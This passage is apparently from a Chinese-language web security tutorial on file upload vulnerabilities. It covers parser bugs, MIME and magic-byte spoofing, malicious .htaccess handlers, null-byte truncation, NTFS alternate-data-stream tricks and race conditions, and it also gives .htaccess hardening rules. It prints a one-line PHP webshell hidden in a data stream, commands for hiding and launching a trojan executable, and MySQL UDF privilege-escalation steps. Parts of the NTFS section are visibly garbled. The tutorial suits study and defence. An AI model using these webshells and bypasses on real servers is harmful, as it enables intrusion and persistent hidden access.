punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$ext_arr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$temp_file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$img_path</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'save_path'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"YmdHis\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp_file</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$img_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'上传出错！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"只允许上传.jpg|.png|.gif类型文件！\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"原理-2\"><a class=\"anchor\" href=\"#原理-2\">#</a> 原理</h3>\n<p>当浏览器将文件提交到服务器端的时候，服务器端会根据设定的黑白名单对浏览器提交上来的文件扩展名进行检测，如果上传的文件扩展名不符合黑白名单的限制，则不予上传，否则上传成功。</p>\n<h3 id=\"绕过方法-2\"><a class=\"anchor\" href=\"#绕过方法-2\">#</a> 绕过方法</h3>\n<p>在一些 Web server 中，存在解析漏洞:</p>\n<pre><code>1. 老版本的IIS6中的目录解析漏洞，如果网站目录中有一个 /.asp/目录，那么此目录下面的一切内容都会被当作asp脚本来解析\n\n2. 老版本的IIS6中的分号漏洞：IIS在解析文件名的时候可能将分号后面的内容丢弃，那么我们可以在上传的时候给后面加入分号内容\n来避免黑名单过滤，如 a.asp;jpg\n\n3. 旧版Windows Server中存在空格和dot漏洞类似于 a.php. 和 a.php[空格] 这样的文件名存储后会被windows去掉点和空格，从而使\n得加上这两个东西可以突破过滤，成功上传，并且被当作php代码来执行\n\n4. nginx(0.5.x, 0.6.x, 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37)空字节漏洞 xxx.jpg%00.php 这样的文件名会被解析为php代码运行\n（fastcgi会把这个文件当php看，不受空字节影响，但是检查文件后缀的那个功能会把空字节后面的东西抛弃，所以识别为jpg）\n\n5. apache1.x,2.x的解析漏洞，上传如a.php.rar a.php.gif 类型的文件名，可以避免对于php文件的过滤机制，但是由于apache在解析\n文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar等扩展名是apache不能识别的，因此就会直接将类型识别为php，\n从而达到了注入php代码的目的\n</code></pre>\n<h2 id=\"服务器检测mime\"><a class=\"anchor\" href=\"#服务器检测mime\">#</a> 服务器检测 MIME</h2>\n<p>原理 检查 Content-Type</p>\n<p>HTTP 协议规定了上传资源的时候在 Header 中加上一项文件的 MIMETYPE，来识别文件类型，这个动作是由浏览器完成的，服务端可以检查此类型不过这仍然是不安全的，因为 HTTP header 可以被发出者或者中间人任意的修改。</p>\n<h3 id=\"常见类型\"><a class=\"anchor\" href=\"#常见类型\">#</a> 常见类型</h3>\n<table>\n    <tr>\n        <th>文件后缀</th>\n        <th>Mime类型</th>\n        <th>说明</th>\n    </tr>\n    <tr>\n        <td>.flv</td>\n        <td>flv/flv-flash</td>\n        <td>在线播放</td>\n    </tr>\n    <tr>\n        <td>.html或.htm</td>\n        <td>text/html</td>\n        <td>超文本标记语言文本</td>\n    </tr>\n    <tr>\n        <td>.rtf</td>\n        <td>application/rtf</td>\n        <td>RTF文本</td>\n    </tr>\n    <tr>\n        <td>.gif 或.png</td>\n        <td>image/gif(image/png)</td>\n        <td>GIF图形/PNG图片</td>\n    </tr>\n    <tr>\n        <td>.jpeg或.jpg</td>\n        <td>image/jpeg</td>\n        <td>JPEG图形</td>\n    </tr>\n    <tr>\n        <td>.au</td>\n        <td>audio/basic</td>\n        <td>au声音文件</td>\n    </tr>\n    <tr>\n        <td>.mid或.midi</td>\n        <td>audio/midi或audio/x-midi</td>\n        <td>MIDI音乐文件</td>\n    </tr>\n    <tr>\n        <td>.ra或.ram或.rm</td>\n        <td>audio/x-pn-realaudio</td>\n        <td>RealAudio音乐文件</td>\n    </tr>\n    <tr>\n        <td>.mpg或.mpeg或.mp3</td>\n        <td>video/mpeg</td>\n        <td>MPEG文件</td>\n    </tr>\n    <tr>\n        <td>.avi</td>\n        <td>video/x-msvideo</td>\n        <td>AVI文件</td>\n    </tr>\n    <tr>\n        <td>.gz</td>\n        <td>application/x-gzip</td>\n        <td>GZIP文件</td>\n    </tr>\n    <tr>\n        <td>.tar</td>\n        <td>application/x-tar</td>\n        <td>TAR文件</td>\n    </tr>\n    <tr>\n        <td>.exe</td>\n        <td>application/octet-stream</td>\n        <td>下载文件类型</td>\n    </tr>\n    <tr>\n        <td>.rmvb</td>\n        <td>video/vnd.rn-realvideo</td>\n        <td>在线播放</td>\n    </tr>\n    <tr>\n        <td>.txt</td>\n        <td>text/plain</td>\n        <td>普通文本</td>\n    </tr>\n    <tr>\n        <td>.mrp</td>\n        <td>application/octet-stream</td>\n        <td>MRP文件&#xff08;国内普遍的手机&#xff09;</td>\n    </tr>\n    <tr>\n        <td>.ipa</td>\n        <td>application/iphone-package-archive</td>\n        <td>IPA文件(IPHONE)</td>\n    </tr>\n    <tr>\n        <td>.deb</td>\n        <td>application/x-debian-package-archive</td>\n        <td>DED文件(IPHONE)</td>\n    </tr>\n    <tr>\n        <td>.apk</td>\n        <td>application/vnd.android.package-archive</td>\n        <td>APK文件(安卓系统)</td>\n    </tr>\n    <tr>\n        <td>.cab</td>\n        <td>application/vnd.cab-com-archive</td>\n        <td>CAB文件(Windows Mobile)</td>\n    </tr>\n    <tr>\n        <td>.xap</td>\n        <td>application/x-silverlight-app</td>\n        <td>XAP文件(Windows Phone 7)</td>\n    </tr>\n    <tr>\n        <td>.sis</td>\n        <td>application/vnd.symbian.install-archive</td>\n        <td>SIS文件(symbian平台)</td>\n    </tr>\n    <tr>\n        <td>.jar</td>\n        <td>application/java-archive</td>\n        <td>JAR文件(JAVA平台手机通用格式)</td>\n    </tr>\n    <tr>\n        <td>.jad</td>\n        <td>text/vnd.sun.j2me.app-descriptor</td>\n        <td>JAD文件(JAVA平台手机通用格式)</td>\n    </tr>\n    <tr>\n        <td>.sisx</td>\n        <td>application/vnd.symbian.epoc/x-sisx-app</td>\n        <td>SISX文件(symbian平台)</td>\n    </tr>\n</table>\n<h3 id=\"绕过方法-3\"><a class=\"anchor\" href=\"#绕过方法-3\">#</a> 绕过方法</h3>\n<p>使用各种各样的工具（如 burpsuite）强行篡改 Header 就可以，将 Content-Type: application/php 改为其他 web 程序允许的类型。</p>\n<h2 id=\"文件头检查文件\"><a class=\"anchor\" href=\"#文件头检查文件\">#</a> 文件头检查文件</h2>\n<p>原理:<br />\n 利用的是每一个特定类型的文件都会有不太一样的开头或者标志位。</p>\n<h3 id=\"常见格式\"><a class=\"anchor\" href=\"#常见格式\">#</a> 常见格式</h3>\n<table>\n    <tr>\n        <th align=\"left\">格式</th>\n        <th align=\"left\">文件头</th>\n    </tr>\n    <tr>\n        <td align=\"left\">TIFF (tif)</td>\n        <td align=\"left\">49492A00</td>\n    </tr>\n    <tr>\n        <td align=\"left\">Windows Bitmap (bmp)</td>\n        <td align=\"left\">424D</td>\n    </tr>\n    <tr>\n        <td align=\"left\">CAD (dwg)</td>\n        <td align=\"left\">41433130</td>\n    </tr>\n    <tr>\n        <td align=\"left\">Adobe Photoshop (psd)</td>\n        <td align=\"left\">38425053</td>\n    </tr>\n    <tr>\n        <td align=\"left\">JPEG (jpg)</td>\n        <td align=\"left\">FFD8FF</td>\n    </tr>\n    <tr>\n        <td align=\"left\">PNG (png)</td>\n        <td align=\"left\">89504E47</td>\n    </tr>\n    <tr>\n        <td align=\"left\">GIF (gif)</td>\n        <td align=\"left\">47494638</td>\n    </tr>\n    <tr>\n        <td align=\"left\">XML (xml)</td>\n        <td align=\"left\">3C3F786D6C</td>\n    </tr>\n    <tr>\n        <td align=\"left\">HTML (html)</td>\n        <td align=\"left\">68746D6C3E</td>\n    </tr>\n    <tr>\n        <td align=\"left\">MS Word/Excel (xls.or.doc)</td>\n        <td align=\"left\">D0CF11E0</td>\n    </tr>\n    <tr>\n        <td align=\"left\">MS Access (mdb)</td>\n        <td align=\"left\">5374616E64617264204A</td>\n    </tr>\n    <tr>\n        <td align=\"left\">ZIP Archive (zip)，</td>\n        <td align=\"left\">504B0304</td>\n    </tr>\n    <tr>\n        <td align=\"left\">RAR Archive (rar)，</td>\n        <td align=\"left\">52617221</td>\n    </tr>\n    <tr>\n        <td align=\"left\">Wave (wav)，</td>\n        <td align=\"left\">57415645</td>\n    </tr>\n    <tr>\n        <td align=\"left\">AVI (avi)，</td>\n        <td align=\"left\">41564920</td>\n    </tr>\n    <tr>\n        <td align=\"left\">Adobe Acrobat (pdf)，</td>\n        <td align=\"left\">255044462D312E</td>\n    </tr>\n</table>\n<h3 id=\"绕过方法-4\"><a class=\"anchor\" href=\"#绕过方法-4\">#</a> 绕过方法</h3>\n<p>给上传脚本加上相应的幻数头字节就可以，php 引擎会将 &lt;? 之前的内容当作 html 文本，不解释而跳过之，后面的代码仍然能够得到执行比如下面：<br />\n（一般不限制图片文件格式的时候使用 GIF 的头比较方便，因为全都是文本可打印字符。）</p>\n<h2 id=\"限制web-server对特定类型文件的行为htaccess文件攻击\"><a class=\"anchor\" href=\"#限制web-server对特定类型文件的行为htaccess文件攻击\">#</a> 限制 Web Server 对特定类型文件的行为 (.htaccess 文件攻击)</h2>\n<h3 id=\"原理-3\"><a class=\"anchor\" href=\"#原理-3\">#</a> 原理</h3>\n<p>导致文件上传漏洞的根本原因在于服务把用户上传的本应是数据的内容当作了代码，一般而言：用户上传的内容都会被存储到特定的一个文件夹下，比如我们很多人习惯于放在 ./upload/ 下面要防止数据被当作代码执行，我们可以限制 web server 对于特定文件夹的行为。</p>\n<p>大多数服务端软件都可以支持用户对于特定类型文件的行为的自定义，以 Apache 为例：</p>\n<blockquote>\n<p>在默认情况下，对与 .php 文件 Apache 会当作代码来执行，对于 html,css,js 文件，则会直接由 HTTP Response 交给客户端程序对于一些资源文件，比如 txt，doc，rar 等等，则也会以文件下载的方式传送的客户端。我们希望用户上传的东西仅仅当作资源和数据而不能当作代码。因此 Apache 使用服务器程序的接口来进行限制利用 .htaccess 文件机制来对 web server 行为进行限制。<br />\n禁止脚本执行有多种方式可以实现，而且分别有不同的效果：</p>\n</blockquote>\n<p>指定特定扩展名的文件的处理方式，原理是指定 Response 的 Content-Type 可以加上如下几行</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>AddType text/plain .pl .py .php</pre></td></tr></table></figure><p>这种情况下，以上几种脚本文件会被当作纯文本来显示出来，你也可以换成其他的 Content-Type</p>\n<p>这种情况下，以上几种脚本文件会被当作纯文本来显示出来，你也可以换成其他的 Content-Type</p>\n<p>如果要完全禁止特定扩展名的文件被访问，用下面的几行</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Options -ExecCGI</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>AddHandler cgi-script .php .pl .py .jsp .asp .htm .shtml .sh .cgi识别</pre></td></tr></table></figure><p>在这种情况下，以上几种类型的文件被访问的时候，会返回 403 Forbidden 的错误</p>\n<p>强制 web 服务器对于特定文件类型的处理，与第一条不同的是， 下面的方法直接强行让 apache 将文件识别为你指定的类型，而第一种是让浏览器符合上面正则的全部被认为是纯文本，也可以继续往里面加入其他类型。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>FilesMatch <span class=\"token string\">\"\\.(php|pl|py|jsp|asp|htm|shtml|sh|cgi)$\"</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>ForceType text/plain</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">&lt;</span>/FilesMatch<span class=\"token operator\">></span></pre></td></tr></table></figure><p>只允许访问特定类型的文件。使得该文件夹里面只有图片扩展名的文件才可以被访问，其他类型都是拒绝访问 (白名单策略)。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>Files ^<span class=\"token punctuation\">(</span>*.jpeg<span class=\"token operator\">|</span>*.jpg<span class=\"token operator\">|</span>*.png<span class=\"token operator\">|</span>*.gif<span class=\"token punctuation\">)</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>order deny,allow</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>deny from all</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">&lt;</span>/Files<span class=\"token operator\">></span></pre></td></tr></table></figure><h3 id=\"绕过方法-5\"><a class=\"anchor\" href=\"#绕过方法-5\">#</a> 绕过方法</h3>\n<p>可以通过 move_uploaded_file 函数把自己写的.htaccess 文件上传，覆盖掉服务器上的文件，来定义文件类型和执行权限如果做到了这一点，将获得相当大的权限。</p>\n<p>补充知识 htaccess：</p>\n<blockquote>\n<p>.htaccess 文件 (或者 &quot;分布式配置文件&quot;）, 全称是 Hypertext Access (超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 Apache 的 AllowOverride 指令来设置。概述来说，htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现：网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许 / 阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>\n</blockquote>\n<hr />\n<p>这里还有一种</p>\n<p>如果 PHP 安全没配置好就可以通过 move_uploaded_file 函数把自己写的.htaccess 文件覆盖掉服务器上的，这样就能任意定义解析名单了。<br />\n来做个小实验，先描述下效果：</p>\n<blockquote>\n<p>通过一个.htaccess 文件调用 php 的解析器去解析一个文件名中只要包含 &quot;haha&quot; 这个字符串的任意文件，所以无论文件名是什么样子，只要包含 &quot;haha&quot; 这个字符串，都可以被以 php 的方式来解析，是不是相当邪恶，一个自定义的.htaccess 文件就可以以各种各样的方式去绕过很多上传验证机制建一个.htaccess 文件，里面的内容如下</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>FilesMatch <span class=\"token string\">\"haha\"</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    SetHandler application/x-httpd-php</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">&lt;</span>/FilesMatch<span class=\"token operator\">></span></pre></td></tr></table></figure><h2 id=\"文件系统00截断\"><a class=\"anchor\" href=\"#文件系统00截断\">#</a> 文件系统 00 截断</h2>\n<p>00 截断的条件 (过气了)</p>\n<pre><code class=\"language-txt\">1.  php版本小于5.3.4\n2.  php的magic\\_quotes\\_gpc为OFF状态\n</code></pre>\n<h3 id=\"原理-4\"><a class=\"anchor\" href=\"#原理-4\">#</a> 原理</h3>\n<p>** 在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束。** 利用 00 截断就是利用程序员在写程序时对文件的上传路径过滤不严格，产生 0x00、%00 上传截断漏洞。</p>\n<h3 id=\"绕过方法-6\"><a class=\"anchor\" href=\"#绕过方法-6\">#</a> 绕过方法</h3>\n<p>通过抓包截断将【evil.php.jpg】后面的一个【.】换成【0x00】。在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束，从而将【evil.php.jpg】的内容写入到【evil.php】中，从而达到攻击的目的。</p>\n<h2 id=\"7windows-ntfs文件系统特性绕过\"><a class=\"anchor\" href=\"#7windows-ntfs文件系统特性绕过\">#</a> 7.windows NTFS 文件系统特性绕过</h2>\n<p>NTFS 交换数据流（alternate data streams 简称 ADS）是 NTFS 磁盘格式的新特性，见漏洞详细可查 CVE-1999-0278。</p>\n<p><img data-src=\"image006.png\" alt=\"\" /></p>\n<p>一个完整的流的格式为：::<br />\n 文件主流即我们平时可以看见的可以存储数据的文件。而非主文件流寄宿于主文件流中，无法直接读取。<br />\n修改宿主文件的内容或流的内容，不会对彼此造成影响。<br />\n流类型总是以符 号 作 为 开 始 ， N T F S 文 件 系 统 中 的 文 件 至 少 包 含 一 个 主 流 ， 也 就 是 d a t a 流 (符号作为开始，NTFS 文件系统中的文件至少包含一个主流，也就是 data 流 (符号作为开始，NTFS 文件系统中的文件至少包含一个主流，也就是 data 流 (DATA)，默认流名为空。<br />\nADS 可以省略流名，但不能省略流类型。<br />\nNTFS 文件系统中的文件夹没有 data 流，但可以指派 data 流，文件夹的主流为 directory 流 (I N D E X A L L O C A T I O N) ， 流 名 默 认 为 INDEX_ALLOCATION)，流名默认为 INDEX A LLOCATION)，流名默认为 I30<br />\n 当我们对一个在 NTFS 分区中的 ASP 文件发出包含 D A T A 请 求 ， I I S 会 检 查 最 后 一 个 “.” 后 面 的 扩 展 名 ， 因 为 多 了 : : DATA 请求，IIS 会检查最后一个 “.” 后面的扩展名，因为多了::DATA 请求，IIS 会检查最后一个 “.” 后面的扩展名，因为多了::DATA，结果 IIS 不认为这是一个 ASP 文件，而文件系统可以识别该请求，于是返回 ASP 的源代码。</p>\n<h3 id=\"绕过方法-7\"><a class=\"anchor\" href=\"#绕过方法-7\">#</a> 绕过方法</h3>\n<ol>\n<li>IIS 目录访问权限绕过：在 IIS6.0+PHP、IIS7+asp、IIS7.5+php 的环境下，如果目录是通过 HTTP Basic 来认证，假设网站根目录存在 index.php 文件，可通过构造如下方式来绕过认证直接访问目录下的文件。</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>/admin::<span class=\"token variable\">$INDEX_ALLOCATION</span>/index.php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>/admin:<span class=\"token variable\">$i30</span><span class=\"token builtin class-name\">:</span><span class=\"token variable\">$INDEX_ALLOCATION</span>/index.asp</pre></td></tr></table></figure><ol start=\"2\">\n<li>上传绕过黑名单：在测试中我们发现如果上传的文件名字为：test.php::$DATA，会在服务器上生成一个 test.php 的文件，其中内容和所上传文件内容相同，并被解析。</li>\n</ol>\n<table>\n    <tr>\n        <th>上传的文件名</th>\n        <th>服务器表面现象</th>\n        <th>生成的文件内容</th>\n    </tr>\n    <tr>\n        <td>Test.php:a.jpg</td>\n        <td>生成Test.php</td>\n        <td>空</td>\n    </tr>\n    <tr>\n        <td>Test.php::$DATA</td>\n        <td>生成test.php</td>\n        <td>&lt;?php phpinfo();?&gt;</td>\n    </tr>\n    <tr>\n        <td>Test.php::$INDEX_ALLOCATION</td>\n        <td>生成test.php文件夹</td>\n        <td></td>\n    </tr>\n    <tr>\n        <td>Test.php::$DATA\\0.jpg</td>\n        <td>生成0.jpg</td>\n        <td>&lt;?php phpinfo();?&gt;</td>\n    </tr>\n    <tr>\n        <td>Test.php::$DATA\\aaa.jpg</td>\n        <td>生成aaa.jpg</td>\n        <td>&lt;?php phpinfo();?&gt;</td>\n    </tr>\n</table>\n<pre><code class=\"language-txt\">注意：\n对于windows环境的服务器，上传test.php:.jpg类型的文件，当文件传到服务端时，windows会将该文件识别成ADS，\n从而认为其宿主文件名为1.asp而将.jpg识别为流名。\n通过notepad test.php:.jpg可以查看内容，所以test.php内容为空是正常的。\n然后修改上传的文件名为test.&gt;&gt;&gt;或者test.&lt;、test.&lt;&lt;&lt;、test.&gt;&gt;&lt;再上传，会重写test.php。\n原因是在PHP+IIS的环境下，&quot; 同义. &gt;同义? &lt;同义*\n</code></pre>\n<ol start=\"3\">\n<li>隐藏 webshell：</li>\n</ol>\n<p>在服务器上 echo 一个数据流文件进去，比如 index.php 是网页正常文件，命令如下：<br />\n <code>echo ^&lt;?php @eval(request[cmd])?^ &gt;&gt; index.php:hidden.jpg</code> <br />\n 这样生成了一个不可见的 shell hidden.jpg，type dir del 命令都不行。利用文件包含<?php include('shell.php:hidden.jpg')?>就是一句话。</p>\n<ol start=\"4\">\n<li>mysql 中的 udf 提权:</li>\n</ol>\n<pre><code class=\"language-txt\">如果数据库用户对数据库mysql（注意指的是数据库里的默认库mysql）具有insert和delete权限，就可以创建加载自定义函数。\n而又因为mysql服务是以system权限运行在windows主机上，所以这个时候我们就可以通过自定义函数以system权限执行命令了。\n</code></pre>\n<p>如果数据库用户对数据库 mysql（注意指的是数据库里的默认库 mysql）具有 insert 和 delete 权限，就可以创建加载自定义函数。<br />\n而又因为 mysql 服务是以 system 权限运行在 windows 主机上，所以这个时候我们就可以通过自定义函数以 system 权限执行命令了。</p>\n<p>Mysql 5.0.67 之前，DLL 的导入目录是 C:\\windows\\system32<br />\n 从 MySQL 5.1 开始，要求目录必须是 mysql 目录下的 lib\\plugin\\ 目录，而且 mysql 5.1 之后的常用安装版本是默认不存在 lib\\plugin 目录的。</p>\n<p>执行 sql 语句<br />\n <code>show variables like '%plugin%';</code></p>\n<p>查看目录位置。<br />\n利用 ADS 依次创建 lib、plugin 目录</p>\n<p><code>select 'xxx' into outfile 'E:\\\\phpstudy\\\\PHPTutorial\\\\MySQL\\\\lib\\\\plugin::$INDEX_ALLOCATION';</code></p>\n<p>如果创建失败的话，执行</p>\n<p><code>show variables like '%secure%';</code> <br />\n 看看 secure_file_priv 的值：</p>\n<pre><code class=\"language-txt\">null表示限制mysqld不允许导入导出\n当secure_file_priv的值为/tmp/，表示限制mysqld 的导入导出只能在/tmp/目录下\n当secure_file_priv的值为空，表示不对mysqld的导入导出做限制\n</code></pre>\n<ol start=\"5\">\n<li>隐藏 exe 文件</li>\n</ol>\n<p><code>type muma.txt test.txt:muma.exe</code></p>\n<p>在 xp 中可以用 start test.txt:muma.exe 执行，但是 win7 以上这样执行会报错。win7 及之后的系统的正确姿势如下：<br />\n创建一个符号链接文件 test.exe，链接到寄生的交换数据流可执行文件 test.txt:muma.exe 上：mklink test.exe,test.txt:muma.exe，然后执行 start test.exe/b 即可<br />\n更新一个方法：<br />\n <code>wmic process call create &quot;C:\\ProjectCode\\test\\test:putty.exe&quot;</code></p>\n<pre><code class=\"language-txt\">在WinXP中，可执行文件可以和文本文件一样实现真正的隐藏，这可能也是当时大多数杀毒软件添加数据流病毒查\n杀功能的原因；在Win7之后的系统中，微软可能出于安全考虑，不允许直接运行交换数据流可执行文件，必须要\n创建符号链接，这个符号链接是可见的（当然可以使用其他手段隐藏这个符号链接），并且这个符号链接创建出来\n后不能复制到其他地方，只能在创建的那个位置使用命令行方式调用（鼠标双击会报错）。\n</code></pre>\n<p>查看隐藏流文件</p>\n<pre><code class=\"language-txt\">使用这两款小工具配合进行检测和清除寄生的交换数据流\nhttps://pan.baidu.com/share/link?shareid=134850&amp;uk=1108295926\nlabs.exe检测，streams.exe进行清理。\n还有一个叫做AlternateStreamView的工具也可以\n</code></pre>\n<h2 id=\"二次渲染绕过\"><a class=\"anchor\" href=\"#二次渲染绕过\">#</a> 二次渲染绕过</h2>\n<p>感觉这个的知识点偏向文件格式分析 (MISC)。在制作图片马的时候</p>\n<p>往往是在图片后头附件一段 php 代码，或者是改包发送一个图片马。但是如果使用了二次渲染。我们上传的文件名称会被修改，并且文件末尾段一些冗余的信息（一句话木马）会被删除。</p>\n<p>所以很明显，我们只需要将我们需要写入的东西塞在图片中间（虽然会使图片损坏，但是我们又不需要图片。。），用 winhex 或者是 010editor 等在文件内进行修改即可。</p>\n<h2 id=\"条件竞争\"><a class=\"anchor\" href=\"#条件竞争\">#</a> 条件竞争</h2>\n<p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p>\n<p>该漏洞一般出现在与数据库系统频繁交互的位置，例如金额同步、支付等较敏感操作处。另外条件竞争漏洞也会出现在其他位置，例如文件的操作处理等。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># -*-coding:utf-8-*-</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>COUNT <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Run</span><span class=\"token punctuation\">(</span>threads_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">global</span> COUNT</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    read_value <span class=\"token operator\">=</span> COUNT</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"COUNT in Thread-%s is %d\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>threads_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> read_value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    COUNT <span class=\"token operator\">=</span> read_value <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    threads <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        t <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>Run<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        threads<span class=\"token punctuation\">.</span>append<span class=\"token 